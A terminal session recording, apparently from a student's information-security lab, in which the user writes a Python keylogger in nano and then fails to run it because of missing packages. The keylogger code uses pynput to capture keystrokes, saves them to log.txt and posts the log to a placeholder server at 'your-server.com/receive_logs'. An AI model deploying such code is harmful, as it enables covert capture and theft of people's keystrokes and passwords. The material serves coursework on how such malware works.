@@ -1,0 +1,140 @@
+Script started on 2025-03-05 21:25:30+05:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="120" LINES="30"]
+[?2004h]0;murid@Acer: ~/Information_Security/lab13[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13[00m$ mkdir keylogger
+[?2004lcd keylogger
+touch main.py
+[?2004h]0;murid@Acer: ~/Information_Security/lab13[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13[00m$ cd keylogger
+[?2004l[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ touch main.py
+[?2004l[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ pip install pynput
+[?2004lCommand 'pip' not found, but can be installed with:
+sudo apt install python3-pip
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ pip install pynput[1@s[1@u[1@d[1@o[1@ 
+[?2004l[sudo] password for murid: 
+sudo: pip: command not found
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ sudo apt update
+[?2004lsudo apt install python3-pip
+sudo apt install python3-pip
+[33m0% [Working][0m            Get:1 http://security.ubuntu.com/ubuntu jammy-security InRelease [129 kB]
+[33m0% [Waiting for headers] [1 InRelease 1120 B/129 kB 1%][0m                                                       Hit:2 http://archive.ubuntu.com/ubuntu jammy InRelease
+[33m                                                       0% [1 InRelease 42.5 kB/129 kB 33%][0m[33m0% [Waiting for headers] [1 InRelease 76.8 kB/129 kB 60%][0m                                                         Get:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [128 kB]
+[33m0% [3 InRelease 6832 B/128 kB 5%] [1 InRelease 122 kB/129 kB 95%][0m[33m                                                                 0% [3 InRelease 12.5 kB/128 kB 10%][0m[33m0% [3 InRelease 15.4 kB/128 kB 12%][0m[33m                                   0% [Working][0m[33m0% [Waiting for headers][0m                        Hit:4 http://archive.ubuntu.com/ubuntu jammy-backports InRelease
+[33m                        0% [Working][0m[33m100% [Working][0m              Fetched 257 kB in 1s (192 kB/s)
+Reading package lists... 0%Reading package lists... 0%Reading package lists... 0%Reading package lists... 3%Reading package lists... 3%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 33%Reading package lists... 33%Reading package lists... 46%Reading package lists... 46%Reading package lists... 47%Reading package lists... 47%Reading package lists... 47%Reading package lists... 47%Reading package lists... 53%Reading package lists... 53%Reading package lists... 57%Reading package lists... 57%Reading package lists... 60%Reading package lists... 65%Reading package lists... 65%Reading package lists... 70%Reading package lists... 70%Reading package lists... 73%Reading package lists... 73%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 80%Reading package lists... 80%Reading package lists... 83%Reading package lists... 83%Reading package lists... 91%Reading package lists... 91%Reading package lists... 96%Reading package lists... 96%Reading package lists... 98%Reading package lists... 98%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+117 packages can be upgraded. Run 'apt list --upgradable' to see them.
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ pip3 --version
+[?2004lCommand 'pip3' not found, but can be installed with:
+sudo apt install python3-pip
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ pip3 install pynput
+[?2004lCommand 'pip3' not found, but can be installed with:
+sudo apt install python3-pip
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ sudo apt install pyton3-o[Kpip
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+[1;31mE: [0mUnable to locate package pyton3-pip[0m
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ nano main.py
+[?2004l[?2004h[?1049h[22;0;0t[1;30r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[28;54H(B[0;7m[ Reading... ](B[m[28;53H(B[0;7m[ Read 0 lines ](B[m[H(B[0;7m  GNU nano 6.2                                             main.py                                                      [1;119H(B[m[29d(B[0;7m^G(B[m Help[29;16H(B[0;7m^O(B[m Write Out   (B[0;7m^W(B[m Where Is    (B[0;7m^K(B[m Cut[29;61H(B[0;7m^T(B[m Execute     (B[0;7m^C(B[m Location    (B[0;7mM-U(B[m Undo[106G(B[0;7mM-A(B[m Set Mark[30d(B[0;7m^X(B[m Exit[30;16H(B[0;7m^R(B[m Read File   (B[0;7m^\(B[m Replace     (B[0;7m^U(B[m Paste[61G(B[0;7m^J(B[m Justify     (B[0;7m^/(B[m Go To Line  (B[0;7mM-E(B[m Redo[106G(B[0;7mM-6(B[m Copy[2d[?12l[?25h[?25l[1;68H(B[0;7m*[119G(B[m[?12l[?25h[2d(B[0;1m[36mfrom[39m(B[m typ[?25ling (B[0;1m[36mimport[39m(B[m List[28d[K[3d[?12l[?25h(B[0;1m[36mimport(B[0m[42m [49m(B[m[?25l[?12l[?25h requests[?25l[4d[?12l[?25h(B[0;1m[36mfrom[39m(B[m py[?25l[?12l[?25hnput.key[?25l[?12l[?25hboard im[?25l[?12l[?25h(B[0;1m[36mimport[39m(B[m Ke[?25l[?12l[?25hy, List[?25lener[6d[?12l[?25h(B[0;1m[31m# Global[39m(B[m[?25l[?12l[?25h(B[0;1m[31m variabl[39m(B[m[?25l(B[0;1m[31mes[7d[39m(B[m[?12l[?25hchar_[?25l[?12l[?25hcount =[?25l 0[8d[?12l[?25hsaved[?25l[?12l[?25h_keys =[?25l [][9d[?12l[?25hAPI_UR[?25l[?12l[?25hL = "http://y[?25l[?12l[?25hour-serv[?25l[?12l[?25her.com/r[?25l[?12l[?25heceive_[?25l[?12l[?25h[9;11H(B[0;1m[32m"http://your-server.com/receive_logs"(B[0m[42m  [49m(B[m[?25l[?12l[?25h (B[0;1m[31m # Repl[39m(B[m[?25l[?12l[?25h(B[0;1m[31mace with[39m(B[m[?25l[?12l[?25h(B[0;1m[31m your A[39m(B[m[?25l(B[0;1m[31mPI endpoint[11d[39m(B[m[?12l[?25hd[?25l[?12l[?25h(B[0;1m[36mdef[34m on_k[39m(B[m[?25l[?12l[?25h(B[0;1m[34mey_press[39m(B[m(key:[?25l[?12l[?25h str):[?25l[12d[?12l[?25h    (B[0;1m[32m""[39m(B[m[?25l"""(B[m Cal[?12l[?25h[?25llback function f[?12l[?25h[?25l(B[0;1m[36mfor[39m(B[m key p[?12l[?25h[?25lress eve[?12l[?25h[?25lnts. (B[0;1m[32m""[39m(B[m[?12l[?25h[?25l[5G(B[0;1m[32m""" Callback function for key press events. """[13;5H[36mtry[39m(B[m:[14d[?12l[?25h[42m  [49m(B[m[?25l[?12l[?25h[8G[1K print("K[?25l[?12l[?25h(B[0;1m[32m"Key Pressed:"[39m(B[m[?25l, key)[15d[?12l[?25h[?25l[?12l[?25h    (B[0;1m[36mexcept[39m(B[m Exce[?25l[?12l[?25hption (B[0;1m[36mas[39m(B[m[?25l ex:[16d[?12l[?25h[42m  [49m(B[m[?25l[?12l[?25h[8G[1K print("E[?25l[?12l[?25h(B[0;1m[32m"Error:"[39m(B[m[?25l, ex)[17d[?12l[?25h[?25l[18d[?12l[?25h(B[0;1m[36mdef[34m on_key_re[39m(B[m[?25l[?12l[?25h(B[0;1m[34mlease[39m(B[m(k[?25ley):[19d[?12l[?25h[42m [49m(B[m[?25l    """(B[m Callb[?12l[?25h[?25lack function (B[0;1m[36mfor[39m(B[m key rel[?12l[?25h[?25l[5G(B[0;1m[32m""" Callback function for key release events. """[20d[39m(B[m[?12l[?25h    (B[0;1m[36mglobal[39m(B[m s[?25laved_keys, char_count[42m  [22d[49m(B[m[?12l[?25h    (B[0;1m[36mif[39m(B[m key == Key.es[?25lc:[23;9H(B[0;1m[36mreturn[39m(B[m (B[0;1m[35mFalse[39m(B[m (B[0;1m[31m # Stop logging[25d[39m(B[m[?12l[?25h    (B[0;1m[36melif[39m(B[m key == Key.enter:[?25l[26;9Hwrite_to_file(saved_keys)[27d[?12l[?25h[7G[42m[1K [49m(B[m[?25l[?12l[?25h[1K send_logs_to_server([?25l[?12l[?25h) (B[0;1m[31m #(B[0m[42m [49m(B[m[?25l[?12l[?25h(B[0;1m[31m Send lo[39m(B[m[?25l[?12l[?25h(B[0;1m[31mgs to re[39m(B[m[?25l[?12l[?25h(B[0;1m[31mmote ser[39m(B[m[?25l7[2;28r8[28d
+[1;30r[26;57H(B[0;1m[31mver[27d[39m(B[m[?12l[?25h[42m    [49m(B[m[?25l7[2;28r8[28d[3S[1;30r[24;8H[1K char_count = 0[25;9Hsaved_keys = [][27d[?12l[?25h    (B[0;1m[36melif[39m(B[m k[?25l7[2;28r8[28d[3S[1;30r[24;11Hey == Key.space:[25;9Hkey = (B[0;1m[32m" "[39m(B[m (B[0;1m[31m # Convert space key to an actual space[26;9H[39m(B[mwrite_to_file(saved_keys)[27d[?12l[?25h[8G[42m[1K [49m(B[m[?25l7[2;28r8[28d[6S[1;30r[21;8H[1K saved_keys = [][22;9Hchar_count = 0[24;5Hsaved_keys.append(str(key).replace((B[0;1m[32m"'"[39m(B[m, (B[0;1m[32m""[39m(B[m))[25;5Hchar_count += 1[27d[?12l[?25h(B[0;1m[36mdef[34m write_to_file[39m(B[m(keys:[?25l7[2;28r8[28d
+[1;30r[26;25HList[str]):[27;5H"""(B[m Write captured keyst[?12l[?25h[?25lrokes to[?12l[?25h[?25l[5G(B[0;1m[32m""" Write captured keystrokes to log file. """[39m(B[m[?12l[?25h[?25l7[2;28r8[28d
+[1;30r[27;1H[?12l[?25h    (B[0;1m[36mwith[39m(B[m open([?25l[?12l[?25h(B[0;1m[32m"log.txt"[39m(B[m, (B[0;1m[32m"a"[39m(B[m) (B[0;1m[36mas[39m(B[m[?25l7[2;28r8[28d
+[1;30r[26;34Hfile:[27d[?12l[?25h[8G[42m[1K [49m(B[m[?25l[?12l[?25h[1K (B[0;1m[36mfor[39m(B[m key[42m [49m(B[m[?25l[?12l[?25h (B[0;1m[36min[39m(B[m keys:[?25l7[2;28r8[28d
+[1;30r[27;1H[?12l[?25h[27;13H(B[0;1m[36mif[39m(B[m[?25l[?12l[?25h (B[0;1m[32m"key"[39m(B[m.upper([?25l[?12l[?25h) (B[0;1m[36mnot[39m(B[m i[?25l[?12l[?25h(B[0;1m[36min[39m(B[m key.up[?25l[?12l[?25hper():[?25l7[2;28r8[28d
+[1;30r[27;1H[?12l[?25h[6G[42m[1K [49m(B[m[?25l[?12l[?25h[27;16H[1K file.w[?25l[?12l[?25hrite(ke[?25l7[2;28r8[28d
+[1;30r[26;30Hy)[27d[?12l[?25h[42m    [49m(B[m[?25l[?12l[?25h   [1K file.write([?25l[?12l[?25h(B[0;1m[32m"(B[0m[38;5;148m\n(B[0;1m[32m"[39m(B[m)[?25l7[2;28r8[28d[2S[1;30r[27;1H[?12l[?25h(B[0;1m[36mdef[34m se[39m(B[m[?25l[?12l[?25h(B[0;1m[34mnd_logs_to_server[39m(B[m()[?25l7[2;28r8[28d
+[1;30r[26;26H:[27d[?12l[?25h    "[?25l""(B[m Send log.txt contents to[42m [49m(B[m[?12l[?25h[?25l a remote server.[?12l[?25h[?25l7[2;28r8[28d[2S[1;30r[25;5H(B[0;1m[32m""" Send log.txt contents to a remote server. """[26;5H[36mtry[39m(B[m:[27d[?12l[?25h[6G[42m[1K [49m(B[m[?25l[?12l[?25h [1K (B[0;1m[36mwith[39m(B[m open((B[0;1m[32m"log.txt"[39m(B[m, (B[0;1m[32m"r"[39m(B[m)[?25l[?12l[?25h (B[0;1m[36mas[39m(B[m fil[?25l7[2;28r8[28d
+[1;30r[26;41He:[27d[?12l[?25h[42m    [49m(B[m[?25l[?12l[?25h[12G[1K logs = f[?25l[?12l[?25hile.read[?25l7[2;28r8[28d
+[1;30r[26;29H()[27d[?12l[?25h[42m   [49m(B[m[?25l[?12l[?25h    [1K response = requests.post(A[?25l[?12l[?25hPI_U[?25l[?12l[?25hRL, d[?25l[?12l[?25hata={(B[0;1m[32m"logs"[39m(B[m:[?25l[?12l[?25h logs})[?25l7[2;28r8[28d
+[1;30r[27;1H[?12l[?25h[6G[42m[1K [49m(B[m[?25l7[2;28r8[28d
+[1;30r[26;8H[1K (B[0;1m[36mif[39m(B[m response.status_code == 200:[27d[?12l[?25h[27;13Hprint("[?25l7[2;28r8[28d[2S[1;30r[25;19H(B[0;1m[32m"Logs sent successfully!"[39m(B[m)[26;5H(B[0;1m[36mexcept[39m(B[m Exception (B[0;1m[36mas[39m(B[m e:[27d[?12l[?25h[42m    [49m(B[m[?25l7[2;28r8[28d[3S[1;30r[24;8H[1K print((B[0;1m[32m"Failed to send logs:"[39m(B[m, e)[26d(B[0;1m[31m# Start keylogger[27d[39m(B[m[?12l[?25h(B[0;1m[36mwith[39m(B[m Listener(on_press=on_key_press, on_release=on[?25l7[2;28r8[28d[2S[1;30r[25;51H_key_release) (B[0;1m[36mas[39m(B[m listener:[26;5Hprint((B[0;1m[32m"Start key logging..."[39m(B[m)[27d[?12l[?25h    listen[?25l7[2;28r8[28d
+[1;30r[26;11Her.join(timeout=10) (B[0;1m[31m # Runs for 10 seconds[27d[39m(B[m[?12l[?25h    (B[0;1m[36mprint[39m(B[m[?25l7[2;28r8[28d
+[1;30r[26;5Hprint((B[0;1m[32m"End key logging..."[39m(B[m)[27d[?12l[?25h[?25l[28d(B[0;7mSave modified buffer?                                                                                                   [29;1H Y(B[m Yes[K[30d(B[0;7m N(B[m No  [30;16H (B[0;7m^C(B[m Cancel[K[28;23H[?12l[?25h[?25l[29d(B[0;7m^G(B[m Help[29;31H(B[0;7mM-D(B[m DOS Format[29;61H(B[0;7mM-A(B[m Append[29;91H(B[0;7mM-B(B[m Backup File[30d(B[0;7m^C(B[m Cancel[17G[14X[30;31H(B[0;7mM-M(B[m Mac Format[30;61H(B[0;7mM-P(B[m Prepend[30;91H(B[0;7m^T(B[m Browse[28d(B[0;7mFile Name to Write: main.py(B[m[?12l[?25h[?25l[28;53H[1K (B[0;7m[ Writing... ](B[m[K[1;68H(B[0;7m [119G(B[m[28;52H(B[0;7m[ Wrote 63 lines ](B[m[J[30d[?12l[?25h[30;1H[?1049l[23;0;0t[?1l>[?2004l[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ chmod +x main.py
+[?2004l[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ python main.py
+[?2004lCommand 'python' not found, did you mean:
+  command 'python3' from deb python3
+  command 'python' from deb python-is-python3
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ sudo apt install python3-pip
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+The following additional packages will be installed:
+  build-essential bzip2 cpp cpp-11 dpkg-dev fakeroot g++ g++-11 gcc gcc-11 gcc-11-base javascript-common
+  libalgorithm-diff-perl libalgorithm-diff-xs-perl libalgorithm-merge-perl libasan6 libatomic1 libc-dev-bin
+  libc-devtools libc6 libc6-dev libcc1-0 libcrypt-dev libdpkg-perl libexpat1 libexpat1-dev libfakeroot
+  libfile-fcntllock-perl libgcc-11-dev libgomp1 libisl23 libitm1 libjs-jquery libjs-sphinxdoc libjs-underscore
+  liblsan0 libmpc3 libnsl-dev libpython3-dev libpython3-stdlib libpython3.10-dev libquadmath0 libstdc++-11-dev
+  libtirpc-dev libtsan0 libubsan1 linux-libc-dev lto-disabled-list manpages-dev python3 python3-dev python3-minimal
+  python3-pkg-resources python3-setuptools python3-wheel python3.10-dev rpcsvc-proto zlib1g-dev
+Suggested packages:
+  bzip2-doc cpp-doc gcc-11-locales debian-keyring g++-multilib g++-11-multilib gcc-11-doc gcc-multilib autoconf
+  automake libtool flex bison gdb gcc-doc gcc-11-multilib glibc-doc bzr libstdc++-11-doc python3-doc python3-tk
+  python3-venv python-setuptools-doc
+Recommended packages:
+  libnss-nis libnss-nisplus
+The following NEW packages will be installed:
+  build-essential bzip2 cpp cpp-11 dpkg-dev fakeroot g++ g++-11 gcc gcc-11 gcc-11-base javascript-common
+  libalgorithm-diff-perl libalgorithm-diff-xs-perl libalgorithm-merge-perl libasan6 libatomic1 libc-dev-bin
+  libc-devtools libc6-dev libcc1-0 libcrypt-dev libdpkg-perl libexpat1-dev libfakeroot libfile-fcntllock-perl
+  libgcc-11-dev libgomp1 libisl23 libitm1 libjs-jquery libjs-sphinxdoc libjs-underscore liblsan0 libmpc3 libnsl-dev
+  libpython3-dev libpython3.10-dev libquadmath0 libstdc++-11-dev libtirpc-dev libtsan0 libubsan1 linux-libc-dev
+  lto-disabled-list manpages-dev python3-dev python3-pip python3-setuptools python3-wheel python3.10-dev rpcsvc-proto
+  zlib1g-dev
+The following packages will be upgraded:
+  libc6 libexpat1 libpython3-stdlib python3 python3-minimal python3-pkg-resources
+6 upgraded, 53 newly installed, 0 to remove and 111 not upgraded.
+Need to get 69.5 MB/73.0 MB of archives.
+After this operation, 235 MB of additional disk space will be used.
+Do you want to continue? [Y/n] pip3 install pynput
+Abort.
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ python3 main.py
+[?2004lTraceback (most recent call last):
+  File "/home/murid/Information_Security/lab13/keylogger/main.py", line 2, in <module>
+    import requests
+ModuleNotFoundError: No module named 'requests'
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ python3 -m pip install pynput
+[?2004lthon3 main.py
+/usr/bin/python3: No module named pip
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ python3 main.py
+[?2004lTraceback (most recent call last):
+  File "/home/murid/Information_Security/lab13/keylogger/main.py", line 2, in <module>
+    import requests
+ModuleNotFoundError: No module named 'requests'
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ sudo apt install python-is-python3
+[?2004lReading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 0%Reading state information... Done
+The following NEW packages will be installed:
+  python-is-python3
+0 upgraded, 1 newly installed, 0 to remove and 117 not upgraded.
+Need to get 2788 B of archives.
+After this operation, 13.3 kB of additional disk space will be used.
+[33m0% [Working][0m            Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 python-is-python3 all 3.9.2-2 [2788 B]
+[33m80% [1 python-is-python3 2788 B/2788 B 100%][0m[33m                                            100% [Working][0m              Fetched 2788 B in 0s (7468 B/s)
+
+7[0;29r8[1ASelecting previously unselected package python-is-python3.
+(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 24715 files and directories currently installed.)
+Preparing to unpack .../python-is-python3_3.9.2-2_all.deb ...
+7[30;0f[42m[30mProgress: [  0%][49m[39m [..................................................................................................] 87[30;0f[42m[30mProgress: [ 20%][49m[39m [###################...............................................................................] 8Unpacking python-is-python3 (3.9.2-2) ...
+7[30;0f[42m[30mProgress: [ 40%][49m[39m [#######################################...........................................................] 8Setting up python-is-python3 (3.9.2-2) ...
+7[30;0f[42m[30mProgress: [ 60%][49m[39m [##########################################################........................................] 87[30;0f[42m[30mProgress: [ 80%][49m[39m [##############################################################################....................] 8Processing triggers for man-db (2.10.2-1) ...
+
+7[0;30r8[1A[J[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ python main.py
+[?2004lTraceback (most recent call last):
+  File "/home/murid/Information_Security/lab13/keylogger/main.py", line 2, in <module>
+    import requests
+ModuleNotFoundError: No module named 'requests'
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ ls
+[?2004l[0m[01;32mmain.py[0m
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ ./main.py 
+[?2004l./main.py: line 1: from: command not found
+./main.py: line 2: import: command not found
+./main.py: line 3: from: command not found
+./main.py: line 6: char_count: command not found
+./main.py: line 7: saved_keys: command not found
+./main.py: line 8: API_URL: command not found
+./main.py: line 10: syntax error near unexpected token `('
+./main.py: line 10: `def on_key_press(key: str):'
+[?2004h]0;murid@Acer: ~/Information_Security/lab13/keylogger[01;32mmurid@Acer[00m:[01;34m~/Information_Security/lab13/keylogger[00m$ exit
+[?2004lexit
+
+Script done on 2025-03-05 21:29:09+05:00 [COMMAND_EXIT_CODE="2"]
